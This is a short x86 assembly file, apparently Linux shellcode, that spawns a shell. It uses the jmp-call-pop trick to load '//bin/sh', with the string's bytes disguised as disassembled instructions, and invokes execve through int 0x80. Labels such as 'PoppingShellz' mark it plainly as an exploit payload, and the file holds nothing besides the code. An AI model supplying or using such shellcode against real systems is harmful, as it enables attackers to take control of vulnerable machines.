section .text

global _start

_start:
  xor eax, eax            ; zero out accumulator register
  xor ecx, ecx            ; zero out counter register
  jmp short PoppingShellz ; jump to PoppingShellz o------------+
;                                                              |
MeWantShellz:             ; <--------------------------------+ |
  pop ebx                 ; store //bin/sh in base register  | |
  add al, 11              ; add 11 to accumulator register   | |
  int 0x80                ; ping kernel and execute execve() | |
;                                                            | |
PoppingShellz:            ; <--------------------------------|-+
  call MeWantShellz       ; call MeWantShellz o--------------+ 
  das                     ; /
  das                     ; /
  bound  ebp, [ecx+0x6e]  ; bin
  das                     ; /
  jae short 0x69          ; sh
